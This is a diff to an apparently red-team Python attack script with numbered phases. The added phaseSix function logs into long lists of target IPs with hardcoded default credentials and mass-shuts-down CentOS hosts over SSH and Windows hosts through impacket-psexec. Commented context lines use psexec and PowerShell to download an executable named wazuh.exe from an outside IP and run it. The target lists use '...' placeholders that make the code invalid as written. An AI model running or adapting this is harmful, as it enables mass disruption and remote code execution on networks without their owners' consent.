@@ -19,6 +19,28 @@ def log_event(message):
 	with open("logfile.txt", "a") as logfile:
 		logfile.write(log_entry)
 
+def run_ssh_command(hostname, username, password, command):
+    # Create an SSH client
+    ssh = paramiko.SSHClient()
+
+    # Automatically add the server's host key (this is insecure, see the paramiko documentation)
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        # Connect to the remote server
+        ssh.connect(hostname, username=username, password=password)
+
+        # Run the command
+        stdin, stdout, stderr = ssh.exec_command(command)
+
+        # Print the output
+        print(f"Output on {hostname}:")
+        print(stdout.read().decode())
+
+    finally:
+        # Close the SSH connection
+        ssh.close()
+
 def execute_ssh_commands(username, password, host, commands):
     # Create an SSH client
     client = paramiko.SSHClient()
@@ -349,7 +371,43 @@ def phaseFive():
 	# impacket-psexec {username}:{password}@target "powershell.exe -c iwr -uri http://185.141.62.2:8000/wazuh.exe -out C:\Users\Administrator\Music\wazuh.exe"
 	# impacket-psexec {username}:{password}@target "powershell.exe -c C:\Users\Administrator\Music\wazuh.exe"
 
+def phaseSix():
+	log_event("Initiating Phase Six")
+	username = "admin"
+	password = "password"
+	winuser = "spacial.rend"
+	winpass = "BlueTeamSlayer1!"
+	centosTargets = [
+	208.11.20.201, 208.11.20.202, ..., 208.11.20.215,
+	208.11.21.201, 208.11.21.202, ..., 208.11.21.215,
+	208.11.22.201, 208.11.22.202, ..., 208.11.22.215,
+	208.11.23.201, 208.11.23.202, ..., 208.11.23.215,
+	208.11.25.201, 208.11.25.202, ..., 208.11.25.215
+	]
+	windowsTargets = [
+	208.11.20.1, 208.11.20.2, ..., 208.11.20.30,
+	208.11.21.1, 208.11.21.2, ..., 208.11.21.30,
+	208.11.22.1, 208.11.22.2, ..., 208.11.22.30,
+	208.11.23.1, 208.11.23.2, ..., 208.11.23.30,
+	208.11.25.1, 208.11.25.2, ..., 208.11.25.30,
+	]
+	centosCommand = 'shutdown now'
 
+	for target in centosTargets:
+		try:
+			log_event(f"Shutting down centOS {target}")
+			run_ssh_command(target, username, password, centosCommand)
+		except Exception as e:
+			pass
+	
+	for host in windowsTargets:
+		try:
+			command = f"impacket-psexec {winuser}:{winpass}@{host} \"shutdown /r /t 0\""
+			log_event(f"Shutting down windows {host}")
+			subprocess.run(command, shell=True, text=True)
+		except Exception as e:
+			pass
+	
 
 def main():
 	log_event("Script initiated")
